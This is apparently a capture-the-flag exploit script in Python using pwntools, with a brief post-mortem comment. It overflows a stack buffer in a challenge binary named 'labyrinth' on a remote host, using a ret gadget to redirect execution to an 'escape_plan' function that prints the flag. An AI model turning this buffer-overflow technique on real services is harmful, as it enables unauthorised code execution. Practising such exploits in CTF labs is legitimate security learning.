
""" Post Mortem

    Should've followed part of my instict, I know when T've encoutnered strange segfaults on prints before, I should've kept tugging

    """

from pwn import *
from time import sleep

context.binary = './labyrinth'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

HOST = '178.128.174.19'
PORT = 31648

def get_process():
  #proc = process()
  proc = remote(HOST, PORT)

  return proc

def attach_gdb(proc):
  gdb.attach(proc, gdbscript="""

  """)
  sleep(1)

def main():
  proc = get_process()
  #attach_gdb(proc)

  proc.sendlineafter(b'>>', b'69')

  buff = b'A'*0x38 

  f_escape_plan = p64(context.binary.symbols['escape_plan'])
  print_flag = p64(0x004012b0)
  f_main = p64(context.binary.symbols['main'])
  g_ret = p64(0x401602)

  payload = b''.join([
    buff,
    g_ret,
    f_escape_plan
  ])

  proc.sendlineafter(b'>>', payload)
  print(proc.readall())

if __name__ == '__main__':
  main()
